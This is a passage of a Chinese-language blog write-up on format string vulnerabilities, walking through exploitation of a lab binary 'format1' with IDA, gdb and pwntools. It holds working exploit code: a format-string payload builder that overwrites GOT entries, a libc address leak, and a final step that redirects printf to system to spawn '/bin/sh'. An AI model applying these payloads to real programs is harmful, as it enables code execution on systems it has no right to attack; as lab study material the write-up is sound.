<li>用于调整输出和打印的符号、空白、小数点、八进制和十六进制前缀等；</li>
</ul>
</li>
<li>
<p>fieldwidth</p>
<ul>
<li>限制显示数值的最小宽度，当输出字符个数不足限制的宽度时，默认用空格填充，或者flags中的其他填充方式，超过限制宽度不会截断，正常显示；</li>
</ul>
</li>
<li>
<p>precision</p>
<ul>
<li>输出的最大长度；</li>
</ul>
</li>
<li>
<p>length</p>
<ul>
<li>指浮点型参数或者整形参数的长度；
<ul>
<li>hh：1-byte；</li>
<li>h：2-byte；</li>
<li>l：4-byte；</li>
<li>ll：8-byte；</li>
</ul>
</li>
</ul>
</li>
<li>
<p>type</p>
<ul>
<li>
<p>转换说明符，用来说明所应用的转换类型，它是唯一必须的格式域；</p>
<p>| 字符 | 描述 |
| —— | —————————————————————————————— |
| d/i | 有符号十进制整数 |
| u | 无符号十进制整数 |
| x/X | 以十六进制形式输出无符号整数(不输出前缀0x) |
| o | 以八进制形式输出无符号整数(不输出前缀0) |
| s | 字符串 |
| c | 字符 |
| p | 指针 |
| n | 不输出字符，把已经成功输出的字符个数写入对应的整型指针参数所指的变量 |
| f/F | 以小数形式输出单、双精度实数 |
| e/E | 以指数形式输出单、双精度实数 |
| g/G | 以%f%e中较短的输出宽度输出单、双精度实数，%e格式在指数小于-4或者大于等于精度时使用 |
| a/A | 浮点数、十六进制数字和p-计数法 |</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="0x03-漏洞原理">0x03 漏洞原理<a hidden class="anchor" aria-hidden="true" href="#0x03-漏洞原理">#</a></h2>
<ul>
<li>
<p>格式化字符串函数是根据格式化字符串函数来进行解析的，那么相应的要被解析的参数的个数也自然是由这个<strong>格式化字符串</strong>所控制；</p>
<p>根据<strong>cdecl的调用约定</strong>，在进入printf()函数之前，将参数从右到左依次压栈。进入printf()之后,函数首先获取第一个参数，一次读取一个字符。如果字符不是<code>%</code>，字符直接复制到输出中；否则，读取下一个非空字符，获取相应的参数并解析输出。
格式化字符串的参数与后面实际提供的是一一对应的，就不会出现什么问题，但如果在格式化字符串多加几个格式化字符的时候，程序会怎么办呢？此时其可以正常通过编译，并且在栈上取值，按照给的格式化字符来解析对应栈上的值，发生了<strong>格式化字符串漏洞</strong>。</p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103005157.png" alt="img"  />
</p>
</li>
</ul>
<h2 id="0x04-漏洞分析">0x04 漏洞分析<a hidden class="anchor" aria-hidden="true" href="#0x04-漏洞分析">#</a></h2>
<h3 id="分析">分析<a hidden class="anchor" aria-hidden="true" href="#分析">#</a></h3>
<ul>
<li>用IDAPro对<code>format1</code>程序进行分析，程序逻辑简单，在<code>main</code>函数中调用了<code>getname</code>函数
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103005340.png" alt="image-20211103005340205"  />
</li>
</ul>
</li>
<li>查看<code>getname()</code>函数，读取用户输入，发现<code>print(buf)</code>将用户输入进行打印，存在格式化字符串漏洞。
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103005500.png" alt="image-20211103005500847"  />
</li>
</ul>
</li>
<li>由于程序编译时会采用两种表进行辅助，一个为PLT表，一个为GOT表，这两个表是一一对应的，看到带有**@plt**标志的函数时，这个函数其实就是个过渡作用，可以通过PLT表跳转到GOT表来得到函数真正的地址：
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103145752.png" alt="img"  />
</li>
</ul>
</li>
</ul>
<h3 id="利用思路">利用思路<a hidden class="anchor" aria-hidden="true" href="#利用思路">#</a></h3>
<ul>
<li>将exit函数的GOT表地址覆写为main函数的地址，程序每次退出时将再返回到main函数；</li>
<li>通过printf格式化字符串漏洞，获取puts函数地址，再通过libc的相对地址偏移获取system的地址；</li>
<li>用格式化字符串漏洞，将system函数地址覆盖GOT表中printf函数的地址，并在buf 中写入<code>/bin/sh</code>，当执行<code>printf(buf)</code>时，相当于执行<code>system('/bin/sh')</code>；</li>
</ul>
<h3 id="利用过程">利用过程<a hidden class="anchor" aria-hidden="true" href="#利用过程">#</a></h3>
<h4 id="将exit函数的got表地址覆盖为main函数地址">将exit函数的GOT表地址覆盖为main函数地址<a hidden class="anchor" aria-hidden="true" href="#将exit函数的got表地址覆盖为main函数地址">#</a></h4>
<ul>
<li>
<p>将exit函数的GOT表地址覆写为main函数的地址，每次退出时将再返回到main函数。 先解决构建printf（format，[argument]）中format和argument</p>
</li>
<li>
<p>format覆写的格式为：% width c % num $ hhn</p>
<ul>
<li>width是将要写入到$hhn参数中的值，它由覆写的值和已经写入的长度决定，具体为：（已写入的长度-覆写的值）%<code>0x80</code>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103010528.png" alt="image-20211103010528651"  />
</li>
<li>根据反汇编可以看到<code>buf</code>数组的长度为<code>0x80</code></li>
</ul>
</li>
<li>num定了要写入的第num个参数，通过调试具体分析一下</li>
</ul>
</li>
<li>
<p>这里给出两种方法</p>
<ul>
<li>
<p>用gdb调试</p>
<ul>
<li>在<code>main</code>和<code>printf</code>处设置断点。</li>
<li>然后运行程序，运行到<code>printf</code>地方
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103010933.png" alt="image-20211103010933837"  />
</li>
</ul>
</li>
<li>buf的地址为<code>0xffffd12c</code>,是<code>printf</code>中格式化字符串的第<code>7</code>个参数:即<code>(0xffffd12c - 0xffffd110 ) / 4  = 7  </code></li>
</ul>
</li>
<li>
<p>通过pwntools进行查找</p>
<ul>
<li>
<p>简单的exp:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">from</span> pwn <span style="color:#fff;font-weight:bold">import</span> *
</span></span><span style="display:flex;"><span>context.log_level=<span style="color:#0ff;font-weight:bold">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>p = process(<span style="color:#0ff;font-weight:bold">&#39;./format1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload = <span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#39;a&#39;</span> * <span style="color:#ff0;font-weight:bold">4</span> + <span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#39; &#39;</span> + <span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#39; </span><span style="color:#0ff;font-weight:bold">%08x</span><span style="color:#0ff;font-weight:bold">&#39;</span> * <span style="color:#ff0;font-weight:bold">20</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">print</span>(payload)
</span></span><span style="display:flex;"><span>p.sendline(payload)
</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#0ff;font-weight:bold">&#34;Welcome~</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>运行结果如下</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103011811.png" alt="image-20211103011811885"  />
</li>
<li>明显的看到<code>0x61616161</code>即为第七个参数</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>num的确定</p>
<ul>
<li>因为要把exit的GOT地址覆写为main函数地址，即<code>0x8048648</code>，所以应写入四个字节，即重复四次<code>% width c % num $ hhn</code>；</li>
<li>粗略估计width最多占用3个字节，num最多占用2个字节，则每个格式<code>% widthc % num $ hhn</code>占用12个字节，四次重复共48个字节，占用48/4=12个参数；</li>
<li>由于buf是从第7个参数开始，写入的地址从第7+12=19个参数开始，num依次为19、20、21、22；</li>
</ul>
</li>
<li>
<p>确定<code>exit@got</code>的地址；</p>
<ul>
<li>这里同样给出两种方法</li>
<li>gdb查看反汇编指令
<ul>
<li>先<code>disass main</code>查看main函数地址
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103012159.png" alt="image-20211103012159831"  />
</li>
</ul>
</li>
<li>发现<code>exit@plt</code>的地址为<code>0x8048480</code></li>
<li>然后查看<code>disass 0x8048480</code>的反汇编，即进入<code>exit@plt</code>的函数内部
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103145720.png" alt="image-20211103012501812"  />
</li>
</ul>
</li>
<li><code>jmp</code>所对应的的地址即为<code>exit@got</code> 为 <code>0x804a024</code></li>
</ul>
</li>
<li>直接借用gdb中的got命令
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103012126.png" alt="image-20211103012126230"  />
</li>
<li><code>exit@got</code> 为 <code>0x804a024</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>main函数地址</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103012159.png" alt="image-20211103012159831"  />
</li>
<li>第一条即为<code>main</code>函数地址 ： <code>0x08048648</code></li>
</ul>
</li>
<li>
<p>构造格式化字符串:</p>
<ul>
<li>
<p>确定了num和width，也确定了exit函数的got表地址为<code>0x804a024</code>，所以将要覆盖的exit@got地址<code>0x804a024</code>、<code>0x804a025</code>、<code>0x804a026</code>、<code>0x804a027</code>依次写入到第19、20、21、22个参数中，格式化字符串就构造好了：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>%72c%19$hhn%62c%20$hhn%126c%21$hhn%4c%22$hhnaaaa\x24\xa0\x04\x08\x25\xa0\x04\x08\x26\xa0\x04\ x08\x27\xa0\x04\x08
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>编写<code>generate_format(addr, value)</code>函数构造格式化字符串，addr为要覆写的地址，value为覆写的值，函数代码如下：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">def</span> generate_format(addr,value):
</span></span><span style="display:flex;"><span>    payload=<span style="color:#0ff;font-weight:bold">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f"># 已写入的长度</span>
</span></span><span style="display:flex;"><span>    print_count = <span style="color:#ff0;font-weight:bold">0</span>
</span></span><span style="display:flex;"><span>    addr_part = <span style="color:#0ff;font-weight:bold">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f"># range 4 的原因是 地址为四个字节，四个循环即可结束。</span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">for</span> i in <span style="color:#fff;font-weight:bold">range</span>(<span style="color:#ff0;font-weight:bold">4</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> value &gt;&gt; (<span style="color:#ff0;font-weight:bold">8</span>*i) == <span style="color:#ff0;font-weight:bold">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">break</span>
</span></span><span style="display:flex;"><span>        one_byte = (value &gt;&gt; (<span style="color:#ff0;font-weight:bold">8</span>*i)) &amp; <span style="color:#ff0;font-weight:bold">0xff</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">#  0x100的原因 防止出现负数</span>
</span></span><span style="display:flex;"><span>        payload += <span style="color:#0ff;font-weight:bold">&#39;%</span><span style="color:#0ff;font-weight:bold">{0}</span><span style="color:#0ff;font-weight:bold">c%</span><span style="color:#0ff;font-weight:bold">{1}</span><span style="color:#0ff;font-weight:bold">$hhn&#39;</span>.format((one_byte - print_count + <span style="color:#ff0;font-weight:bold">0x100</span>) % <span style="color:#ff0;font-weight:bold">0x100</span>,<span style="color:#ff0;font-weight:bold">19</span>+i)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print_count += (one_byte - print_count) % <span style="color:#ff0;font-weight:bold">0x100</span>
</span></span><span style="display:flex;"><span>        addr_part += p32(addr+i).decode(<span style="color:#0ff;font-weight:bold">&#39;unicode_escape&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload = payload.ljust((<span style="color:#ff0;font-weight:bold">12</span>)*<span style="color:#ff0;font-weight:bold">4</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>)
</span></span><span style="display:flex;"><span>    payload += addr_part
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> payload
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>调用<code>generate_format(exit_got,main)</code>函数，生成的payload作为输入，执行后可以看到exit的got表的第一个地址被覆盖为main函数的地址，即<code>0x08048648</code>；</li>
</ul>
</li>
<li>
<img src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103013110.png" alt="image-20211103013033783" style="zoom: 200%;" />
</li>
</ul>
</li>
</ul>
<h4 id="获取system的地址">获取system的地址<a hidden class="anchor" aria-hidden="true" href="#获取system的地址">#</a></h4>
<ul>
<li>
<p>获取思路分析</p>
<ul>
<li>由于格式化字符串漏洞能够泄露内存关键数据，可以考虑利用这个漏洞泄露system 的地址，利用格式化字符串漏洞，泄露出GOT表中puts的地址，再利用libc中system函数与puts函数的偏移，计算出system地址；</li>
</ul>
</li>
<li>
<p>先获取puts函数的got表地址，(这里与上面的方法相同)，所以puts函数got表的地址为<code>0x804a01c</code>，虽然可以直接查看<code>0x804a01c</code>内容即可得到puts函数的实际地址，这里使用格式化字符串漏洞来获取；</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103013217.png" alt="image-20211103013217060"  />
</li>
</ul>
</li>
<li>
<p>构造格式化字符串</p>
<ul>
<li>构造的格式化字符串格式为：<code>%num$s+puts@got</code>，即把puts@got的地址写入 buf，再通过<code>%s</code>读出；
<ul>
<li>此时读出的<code>puts</code>地址为 <code>puts在程序中真正运行的地址</code></li>
</ul>
</li>
<li>其中<code>%num$s</code>占4个字节，是第7个参数；puts@got占4个字节，是第8个参数，num就可以写为8，即将puts@got的地址写入到第8个参数的位置；</li>
<li>获取了puts的实际地址后，通过libc中两个函数的偏移即可得到system的地址，通过查阅资料可以得到libc的库的位置为<code>/lib/i386-linux-gnu/libc.so.6</code>；
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103013337.png" alt="image-20211103013337896"  />
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>所以get_sys_addr 有如下代码</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p.recvuntil(<span style="color:#0ff;font-weight:bold">&#34;Welcome~</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
</span></span><span style="display:flex;"><span>puts_got_addr = elf.got[<span style="color:#0ff;font-weight:bold">&#34;puts&#34;</span>]
</span></span><span style="display:flex;"><span>payload_puts =  <span style="color:#0ff;font-weight:bold">&#34;%8$s&#34;</span> + p32(puts_got_addr).decode(<span style="color:#0ff;font-weight:bold">&#39;unicode_escape&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p.sendline(payload_puts)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#0ff;font-weight:bold">&#34;Welcome~</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
</span></span><span style="display:flex;"><span>puts_addr = u32(p.recv(<span style="color:#ff0;font-weight:bold">4</span>))
</span></span><span style="display:flex;"><span>libc = ELF(<span style="color:#0ff;font-weight:bold">&#34;/lib/i386-linux-gnu/libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>offset = libc.symbols[<span style="color:#0ff;font-weight:bold">&#39;puts&#39;</span>]-libc.symbols[<span style="color:#0ff;font-weight:bold">&#39;system&#39;</span>]
</span></span><span style="display:flex;"><span>sys_addr = puts_addr - offset
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>运行结果</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103015538.png" alt="image-20211103015538526"  />
</li>
<li>根据接收到的四个字节，我们可以看到拿到<code>puts</code>地址为<code>0xf7e37cd0</code>,<code>system</code>地址为<code>0xf7e0b830</code></li>
<li>将其我们用gdb调试得到的地址相比，正确
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103145848.png" alt="image-20211103013901600"  />
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="覆写got-表中printf地址">覆写got 表中printf地址<a hidden class="anchor" aria-hidden="true" href="#覆写got-表中printf地址">#</a></h4>
<ul>
<li>
<p>原理与覆写exit函数GOT表相同，调用<code>generate_format(printf@got,system_addr)</code>，生成的payload作为输入，代码如下：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>printf_got = elf.got[<span style="color:#0ff;font-weight:bold">&#39;printf&#39;</span>]
</span></span><span style="display:flex;"><span>payload_system = generate_format(printf_got,sys_addr)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p.sendline(payload_system)
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>运行代码<img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103015636.png" alt="image-20211103015636210"  />
</p>
<ul>
<li>可以发现<code>printf@got</code>被覆盖为<code>0xf7e0b830</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="执行systembinsh">执行system(&rsquo;/bin/sh')<a hidden class="anchor" aria-hidden="true" href="#执行systembinsh">#</a></h4>
<ul>
<li>
<p>此时GOT表中printf地址已被覆写为system地址，在buf中输入<code>/bin/sh</code>，执行<code>printf(buf)</code>时，相当于执行<code>system('/bin/sh')</code>，最后代码如下:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p.recvuntil(<span style="color:#0ff;font-weight:bold">&#34;Welcome~</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
</span></span><span style="display:flex;"><span>p.sendline(<span style="color:#0ff;font-weight:bold">&#34;/bin/sh&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p.interactive()   
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>运行编写的python代码，成功拿到shell权限；</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103015912.png" alt="image-20211103015912414"  />
</li>
</ul>
</li>
</ul>
<h2 id="0x05-总结">0x05 总结<a hidden class="anchor" aria-hidden="true" href="#0x05-总结">#</a></h2>
<ul>
<li>格式化字符串漏洞泄露内存数据和覆写内存理解加深。</li>
<li>Linux中got表和plt表的关系进一步理解。</li>
<li>pwntools查看函数参数的位置的一些用法
<ul>
<li>pwntools可以直接导入<code>elf</code>,<code>process</code>,<code>libc库</code></li>
</ul>
</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://www.reus09.top/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">格式化字符串漏洞</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://www.reus09.top/posts/tech/shellcode-%E8%AE%A1%E7%AE%97%E5%99%A8/">
    <span class="title">« Prev</span>
    <br>
    <span>Shellcode 计算器</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="http://www.reus09.top">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
